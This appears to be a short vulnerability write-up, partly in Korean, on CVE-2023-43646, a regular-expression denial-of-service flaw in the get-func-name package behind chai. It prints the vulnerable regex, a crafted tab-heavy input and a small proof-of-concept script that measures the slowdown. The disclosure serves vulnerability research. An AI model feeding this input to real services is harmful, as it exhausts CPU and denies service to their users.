# CVE-2023-43646



## 취약점 개요

- CVE-2023-43646

- CVSS : 8.6

- Sep 26, 2023

- ReDoS in node.js package

- rebob 프로젝트의 일환

## 취약점 설명

[github advisories](https://github.com/chaijs/get-func-name/security/advisories/GHSA-4q6p-r6v2-jvc5)

```
/\sfunction(?:\s|\s/[^(?:*\/)]+/\s*)*([^\(\/]+)/
```

This vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:

```
'\t'.repeat(54773) + '\t/function/i'
```

Here is a simple PoC code to demonstrate the issue:

```
const protocolre = /\sfunction(?:\s|\s/[^(?:*\/)]+/\s*)*([^\(\/]+)/;

const startTime = Date.now();
const maliciousInput = '\t'.repeat(54773) + '\t/function/i'

protocolre.test(maliciousInput);

const endTime = Date.now();

console.log("process time: ", endTime - startTime, "ms");
```


[target package](https://www.npmjs.com/package/chai)
